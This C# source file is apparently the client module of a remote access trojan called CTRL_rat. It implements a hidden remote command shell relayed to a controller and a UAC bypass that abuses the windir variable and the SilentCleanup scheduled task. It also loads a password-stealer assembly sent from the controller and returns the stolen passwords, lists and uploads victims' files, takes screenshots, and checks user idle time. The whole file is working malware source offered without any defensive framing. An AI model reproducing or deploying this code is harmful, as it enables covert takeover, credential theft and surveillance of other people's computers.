using CTRL_rat_Client;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Point = System.Drawing.Point;
using Rectangle = System.Drawing.Rectangle;

namespace CTRL_module
{
    public class cmdShell
    {
        private Process shellProcess;
        public string id;
        public delegate void onDataHandler(cmdShell sender, string e);
        public event onDataHandler onData;

        public cmdShell(string app="cmd.exe")
        {
            try
            {
                id = Guid.NewGuid().ToString("N");
                shellProcess = new Process();
                ProcessStartInfo si = new ProcessStartInfo(app);
                si.Arguments = "";
                si.RedirectStandardInput = true;
                si.RedirectStandardOutput = true;
                si.RedirectStandardError = true;
                si.UseShellExecute = false;
                si.CreateNoWindow = true;
                shellProcess.StartInfo = si;
                shellProcess.OutputDataReceived += shellProcess_OutputDataReceived;
                shellProcess.ErrorDataReceived += shellProcess_ErrorDataReceived;
                shellProcess.Start();
                shellProcess.BeginErrorReadLine();
                shellProcess.BeginOutputReadLine();
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.Message);
            }
        }

        void shellProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            doOnData(e.Data);
        }

        void shellProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            doOnData(e.Data);
        }

        private void doOnData(string data)
        {
            if (onData != null) onData(this, data);
        }

        public void write(string data)
        {
            try
            {
                shellProcess.StandardInput.WriteLine(data);
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.Message);
            }
        }
    }
    internal struct LASTINPUTINFO
    {
        public uint cbSize;

        public uint dwTime;
    }
    public class IdleTimeFinder
    {
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();

        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);
            return (((uint)(Environment.TickCount & int.MaxValue) - (lastInPut.dwTime & int.MaxValue)) & int.MaxValue) / 1000;
        }
    }
    public class Main
    {
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsUserAnAdmin();
        Dictionary<string, cmdShell> shell = new Dictionary<string, cmdShell>();
        Dictionary<string, node> shellnode = new Dictionary<string, node>();
        Assembly pwddll;
        public byte[] objecttobyte(object[] e)
        {
            int len = 0;
            byte[] built = new byte[e.Length];
            foreach (int i in e)
            {
                built[len] = Convert.ToByte(i);
                len++;
            }
            return built;
        }
        public void uacbypass(node client)
        {
            Environment.SetEnvironmentVariable("windir", '"' + System.Reflection.Assembly.GetEntryAssembly().Location + '"' + " ;#", EnvironmentVariableTarget.User);
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
                }
            };
            var payload = new Dictionary<object, object>();
            payload["op"] = "retuacbypass";
            try
            {
                p.Start();
                Thread.Sleep(1500);
                payload["data"] = "Maybe...";
            }
            catch
            {
                payload["data"] = "Failed!";
            }
            Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
            client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
        }
        public byte[] Stream_To_Byte(Stream mem)
        {
            using (var memoryStream = new MemoryStream())
            {
                mem.CopyTo(memoryStream);
                return memoryStream.ToArray();
            }
        }
        public string tempfolder()
        {
            string tempFolder = Path.Combine(System.IO.Path.GetTempPath(), Path.GetTempFileName());
            File.Delete(tempFolder);
            Directory.CreateDirectory(tempFolder);
            return tempFolder;
        }
        public bool service_running(string name)
        {
            ServiceController sc = new ServiceController(name);
            try
            {
                return ((int)sc.Status) == ((int)ServiceControllerStatus.Running);
            }
            catch { return false; }

        }
        public byte[] ImageToByte2(Image img)
        {
            using (var stream = new MemoryStream())
            {
                img.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
                return stream.ToArray();
            }
        }
        public byte[] screenshot() 
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                return ImageToByte2(bitmap);
            }
        }
        public void OnMessage(node client, Dictionary<object, object> response)
        {
            //var g = client.DictionaryToJson(response);
            Console.WriteLine((string)response["op"]);
            if ((string)response["op"] == "grabpwd")
            {
                if (pwddll == null) pwddll = Assembly.Load(objecttobyte(response["data"] as object[]));
                dynamic instance = Activator.CreateInstance(pwddll.GetType("PasswordStealer.Stealer"));
                MethodInfo runMethod = instance.GetType().GetMethod("Run", BindingFlags.Instance | BindingFlags.Public);
                string passwords = (string)runMethod.Invoke(instance, new object[] { });
                var payload = new Dictionary<object, object>();
                payload["op"] = "retpwd";
                payload["data"] = passwords;
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else if ((string)response["op"] == "getpath")
            {
                string path = (string)response["data"];
                var directories = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);
                var data1 = new Dictionary<string, string>();
                foreach (string i in files)
                {
                    var len = new FileInfo(Path.Combine(path, i)).Length;
                    if (len > (Int32.MaxValue / 3) - 20) continue;
                    data1[i] = len.ToString();
                }
                var data = new Dictionary<string, object>();
                data["files"] = data1;
                data["dirs"] = directories;
                var payload = new Dictionary<object, object>();
                payload["op"] = "retpath";
                payload["data"] = data;
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else if ((string)response["op"] == "getfile")
            {
                string path = (string)response["data"];
                var bytes = File.ReadAllBytes(path);
                var payload = new Dictionary<object, object>();
                payload["op"] = "retfile";
                payload["data"] = bytes;
                payload["filename"] = Path.GetFileName(path);
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else if ((string)response["op"] == "getidle")
            {
                var payload = new Dictionary<object, object>();
                payload["op"] = "retidle";
                payload["data"] = IdleTimeFinder.GetIdleTime().ToString();
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else if ((string)response["op"] == "uacbypass")
            {
                uacbypass(client);
            }
            else if ((string)response["op"] == "close")
            {

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else if ((string)response["op"] == "progrestart")
            {
                Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                Process.GetCurrentProcess().Kill();
            }
            else if ((string)response["op"] == "reqapp")
            {
                var x = new cmdShell((string)response["app"]);
                x.onData += onshell;
                shellnode[x.id] = client;
                shell[x.id] = x;
                var payload = new Dictionary<object, object>();
                payload["op"] = "retapp";
                payload["data"] = x.id;
                payload["id"] = (string)response["id"];
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            else if ((string)response["op"] == "reqcommand")
            {
                try
                {
                    shell[(string)response["id"]].write((string)response["data"]);
                }
                catch { }
            }
            else if ((string)response["op"]=="getscrshot") 
            {
                var payload = new Dictionary<object, object>();
                payload["op"] = "retscrshot";
                payload["data"] = screenshot();
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
        }
        public void onshell(cmdShell sender, string e) 
        {
            try
            {
                var payload = new Dictionary<object, object>();
                payload["op"] = "retcommand";
                payload["data"] = e;
                payload["id"] = sender.id;
                var client = shellnode[sender.id];
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            }
            catch { }
        }
        public void OnClose(node client) 
        {
            Console.WriteLine(client.worker_id);
        }
        public void Init(node client)
        {

            return;
        }
    }
}
